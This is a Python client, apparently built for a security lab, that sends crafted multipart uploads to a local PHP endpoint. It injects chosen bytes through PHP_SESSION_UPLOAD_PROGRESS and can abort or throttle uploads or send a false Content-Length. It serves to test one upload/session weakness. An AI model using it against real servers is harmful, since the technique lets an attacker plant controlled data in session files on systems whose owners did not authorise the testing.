#!/usr/bin/env python3
# wp2_upclient.py - binary-safe multipart upload client for the Finding-C pass-2 lab
# usage: wp2_upclient.py PORT MODE SID [options]
#   MODE: full | abort | slow | headers-only
import argparse, socket, sys, time

p = argparse.ArgumentParser()
p.add_argument("port", type=int)
p.add_argument("mode", choices=["full", "abort", "slow", "headers-only"])
p.add_argument("sid")
p.add_argument("--key", default="417C42", help="hex bytes for PHP_SESSION_UPLOAD_PROGRESS value")
p.add_argument("--key-file", default=None, help="file containing hex key bytes (for long keys)")
p.add_argument("--path", default="/up.php")
p.add_argument("--query", default="")
p.add_argument("--filesize", type=int, default=65536)
p.add_argument("--files", type=int, default=1, help="number of file parts")
p.add_argument("--parts", type=int, default=1, help="progress parts BEFORE file")
p.add_argument("--progress-after", action="store_true")
p.add_argument("--progress-mid", action="store_true", help="progress field between file parts")
p.add_argument("--extra", action="append", default=[], help="NAME:HEX extra form field, repeatable")
p.add_argument("--sidfield", action="store_true", help="send PHPSESSID as form field instead of cookie")
p.add_argument("--no-cookie", action="store_true")
p.add_argument("--chunk", type=int, default=16384)
p.add_argument("--delay", type=float, default=0.05)
p.add_argument("--abort-at", type=int, default=65536)
p.add_argument("--filedata-hex", default=None, help="override file payload (hex)")
p.add_argument("--boundary", default="Wp2Bnd2026")
p.add_argument("--timeout", type=float, default=30.0)
p.add_argument("--clen-override", type=int, default=None, help="lie about Content-Length")
a = p.parse_args()

HOST = "127.0.0.1"
BND = a.boundary.encode()
keysrc = a.key_file and open(a.key_file).read().strip() or a.key
key = bytes.fromhex(keysrc) if keysrc else b""

def part(name, value, filename=None):
    d = b'Content-Disposition: form-data; name="' + name + b'"'
    if filename is not None:
        d += b'; filename="' + filename + b'"'
    return b"--" + BND + b"\r\n" + d + b"\r\n\r\n" + value + b"\r\n"

filedata = bytes.fromhex(a.filedata_hex) if a.filedata_hex else (b"A" * a.filesize)

body = b""
for _ in range(max(1, a.parts)):
    body += part(b"PHP_SESSION_UPLOAD_PROGRESS", key)
for e in a.extra:
    n, h = e.split(":", 1)
    body += part(n.encode(), bytes.fromhex(h))
if a.sidfield:
    body += part(b"PHPSESSID", a.sid.encode())
# file parts (interleave a progress field mid-way if asked)
for i in range(max(1, a.files)):
    if i == 1 and a.progress_mid:
        body += part(b"PHP_SESSION_UPLOAD_PROGRESS", key)
    body += part(b"f%d" % i, filedata, filename=b"notes.txt")
if a.progress_after:
    body += part(b"PHP_SESSION_UPLOAD_PROGRESS", key)
body += b"--" + BND + b"--\r\n"

qs = ("?" + a.query) if a.query else ""
hdr = (f"POST {a.path}{qs} HTTP/1.1\r\nHost: {HOST}\r\n")
if not a.no_cookie and not a.sidfield:
    hdr += f"Cookie: PHPSESSID={a.sid}\r\n"
hdr += f"Content-Type: multipart/form-data; boundary={a.boundary}\r\n"
hdr += f"Content-Length: {a.clen_override if a.clen_override is not None else len(body)}\r\n"
hdr += "Connection: close\r\n\r\n"
hdr = hdr.encode()

s = socket.create_connection((HOST, a.port), timeout=a.timeout)
s.settimeout(a.timeout)

if a.mode == "full":
    s.sendall(hdr + body)
elif a.mode == "headers-only":
    s.sendall(hdr)
elif a.mode == "abort":
    # progress part(s) + complete first file-part header + partial data, then cut
    pre = b""
    for _ in range(max(1, a.parts)):
        pre += part(b"PHP_SESSION_UPLOAD_PROGRESS", key)
    for e in a.extra:
        n, h = e.split(":", 1)
        pre += part(n.encode(), bytes.fromhex(h))
    if a.sidfield:
        pre += part(b"PHPSESSID", a.sid.encode())
    fp = part(b"f0", filedata, filename=b"notes.txt")
    fp_hdr = fp[:fp.find(b"\r\n\r\n") + 4]
    cut = a.abort_at
    s.sendall(hdr + pre + fp_hdr + filedata[:cut])
    time.sleep(0.4)
    s.close()
    print(f"ABORTED mid-upload after {cut} file bytes")
    sys.exit(0)
elif a.mode == "slow":
    pre = b""
    for _ in range(max(1, a.parts)):
        pre += part(b"PHP_SESSION_UPLOAD_PROGRESS", key)
    fp = part(b"f0", filedata, filename=b"notes.txt")
    fp_hdr = fp[:fp.find(b"\r\n\r\n") + 4]
    s.sendall(hdr + pre + fp_hdr)
    sent = 0
    while sent < len(filedata):
        n = min(a.chunk, len(filedata) - sent)
        s.sendall(filedata[sent:sent + n])
        sent += n
        time.sleep(a.delay)
    s.sendall(b"\r\n--" + BND + b"--\r\n")

data = b""
try:
    while True:
        c = s.recv(65536)
        if not c:
            break
        data += c
except Exception:
    pass
s.close()
first = data.split(b"\r\n", 1)[0]
print("STATUS:", first.decode(errors="replace"))
body_low = data.lower()
if b"invalid key" in body_low:
    print("RESP-INVALID-KEY: yes")
